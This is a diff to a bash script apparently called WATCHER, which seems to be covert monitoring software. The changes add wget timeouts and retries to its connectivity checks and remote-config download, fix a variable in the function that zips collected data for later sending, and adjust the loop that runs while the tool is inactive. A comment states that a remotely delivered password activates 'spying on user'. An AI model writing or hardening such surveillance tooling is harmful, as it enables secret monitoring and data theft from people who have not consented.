@@ -16,11 +16,11 @@ function check_connection {
 	[ $RAND_NUMB -eq 4 ] && ping -q -w 1 -c 1 www.apple.com > /dev/null && CONNECTION_MODE=1 && return 0
 	[ $RAND_NUMB -eq 5 ] && ping -q -w 1 -c 1 www.onet.pl > /dev/null && CONNECTION_MODE=1 && return 0
 	local RAND_NUMB=`shuf -i 1-5 | head -1`
-	[ $RAND_NUMB -eq 1 ] && `wget -q -O /dev/null --no-cache http://www.google.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 2 ] && `wget -q -O /dev/null --no-cache http://www.yahoo.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 3 ] && `wget -q -O /dev/null --no-cache http://www.microsoft.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 4 ] && `wget -q -O /dev/null --no-cache http://www.apple.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 5 ] && `wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 1 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.google.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 2 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.yahoo.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 3 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.microsoft.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 4 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.apple.com/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 5 ] && `wget -q -O /dev/null --no-cache --timeout=30 --tries=2 http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
 }
 
 function check_smtp {
@@ -59,6 +59,7 @@ function check_dir_size {
 		DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
 	done
 	[ $DIRSIZE -ge $3 ] && clean_dir $DIR_NAME
+	return 0
 }
 
 function clean_dir {
@@ -75,7 +76,7 @@ function remote_config {
 	[ ! -f "$REMOTE_CONFIG_NAME.old" ] && touch "$REMOTE_CONFIG_NAME.old"
 	# following cp command is for testing purposes only; delete it and uncomment wget command!
 	#cp WATCHER-hard.cfg WATCHER.cfg
-	`wget -q --no-cache "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"`
+	`wget -q --no-cache --timeout=30 --tries=2 "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"`
 	if [ $? -eq 1 ]
 	then
 		[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - no success with downloading"
@@ -277,7 +278,7 @@ function send_later {
 	local DIRsl="tosendlater"
 	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
 	local FILEsl=""
-	if [ "$(ls -A $DIR)" ]; then
+	if [ "$(ls -A $DIRsl)" ]; then
 		local FILENAMEsl="tmp/package$DATA.zip"
 		local FILESIZEsl=`du -s $DIRsl/ | cut -f 1`
 		#FILESIZE=$(stat -c%s "tmp/package$DATA.zip")
@@ -433,7 +434,7 @@ DB_DIR_MAX_SIZE=120000
 
 # Remote config:
 REMOTE_CONFIG=2 # 0 - don't; 1 - run only if config exists; 2 - check config but run even if config doesn't exists; 3 - run only when activated by config, but doesn't exit when config file dissapears'
-REMOTE_CONFIG_ADDRESS="http://192.168.1.101" # Address to dir containing file
+REMOTE_CONFIG_ADDRESS="http://127.0.0.1" # Address to dir containing file
 REMOTE_CONFIG_NAME="WATCHER.cfg" # File name
 REMOTE_ACTIVATION_PASS="PASS" # Password (it should be placed at the top of config file), it will activate spying on user if you decoded so
 REMOTE_CHECK_EVERY=10 # check every 10 passes, for special commands
@@ -540,7 +541,7 @@ do
 	########
 	REMOTE_COUNTER=$(($REMOTE_COUNTER+1))
 	[ $CONNECTION_MODE -eq 1 ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0 && remote_config 0;
-	[ $ACTIVATE -eq 0 ] && [ $REMOTE_CONFIG -eq 3 ] && sleep $REMOTE_WAIT_TO_NEXT_CHECK && continue;
+	[ $ACTIVATE -eq 0 ] && [ $REMOTE_CONFIG -eq 3 ] && sleep $REMOTE_WAIT_TO_NEXT_CHECK && check_dir_size "tosendlater" $DIR_MAX_SIZE $DIR_WARNING_SIZE && continue;
 	[ $ACTIVATE -eq 0 ] && [ $CONNECTION_MODE -eq 1 ] && [ $REMOTE_CONFIG -eq 1 ] && ./stop.sh && exit 0;
 	[ $CONNECTION_MODE -eq 0 ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && DB_EXT_ACTIVE=0
 	[ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0
